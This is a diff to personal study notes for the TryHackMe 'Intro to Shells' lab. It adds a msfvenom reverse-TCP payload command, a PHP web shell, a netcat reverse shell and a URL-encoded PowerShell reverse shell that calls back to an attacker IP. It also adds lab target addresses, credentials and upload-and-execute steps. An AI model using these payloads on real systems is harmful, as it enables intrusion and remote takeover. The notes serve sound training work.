@@ -11,7 +11,7 @@ https://tryhackme.com/room/introtoshells
 - [[#`msfvenom`]]
 - [[#`multi/handler`]]
 - [[#WebShells]]
-- 
+- [[#Practicals]]
  
 ___
 ### Tools
@@ -178,6 +178,7 @@ ___
 Payload generator, part of Metasploit
 
 Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
+In practice: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe`
 
 - **Staged:** sent in 2 parts
 	$\rightarrow$ Stager executes on server, connects back to listener, uses connection to load real payload, prevents actual payload from touching disk where it could be detected by antivirus
@@ -216,39 +217,60 @@ ___
 *Script that runs on webserver (in PHP or ASP for instance), executes code on server*
 *Commands are entered on webpage (HTML form / directly into URL), then executed by script, results written on page*
 
-`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+``` php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
 *gets parameter called "cmd" and executes it with shell_exec(), "pre" ensures correct formating of output*
 
+Linux payload to send reverse shell via webshell: `nc <LOCAL-IP> <PORT> -e /bin/bash`
 
+Windows payload to send reverse shell via webshell:
+```
+powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+```
 
 ___
-### WebShells
+### Practicals
 [[#Table of contents|Back to the top]]
 
+**Linux target**
+IP: 10.80.189.128
+SSH credentials
+- Username: shell
+- Password: TryH4ckM3!
 
+**Windows target**
+IP: 10.80.156.33
+Credentials
+- Username: Administrator
+- Password: TryH4ckM3!
+RDP login: `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'`
 
-___
-### WebShells
-[[#Table of contents|Back to the top]]
+**Attacker**: 10.80.119.215
 
+#### 1. Web Shell on Linux
 
+1. **Create** webshell.php file
+```php
+`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+```
 
-___
-### WebShells
-[[#Table of contents|Back to the top]]
+2. **Upload** file on target IP
+3. **Proof of concept:** `10.80.189.128/uploads/webshell.php?cmd=whoami`
+4. Set up **listener** (cf [[#`multi/handler`]])
+5. Send **reverse shell** via webshell: `?cmd=nc 10.80.119.215 4444 -e /bin/bash`
 
+#### 2. Reverse Shell on Linux
 
+1. Put attacker IP and port in `/usr/share/webshells/php/php-reverse-shell.php` file
+2. Upload file
+3. Set up netcat listener: `nc -lvnp 4444`
+4. Send shell by clicking on file on site
 
-___
-### WebShells
-[[#Table of contents|Back to the top]]
+#### 3. Web Shell on Windows
 
-
-
-___
-### WebShells
-[[#Table of contents|Back to the top]]
-
-
-
-___
+Same 1. to 4.
+5. Send reverse shell via webshell
+```
+powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.80.119.215%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+```
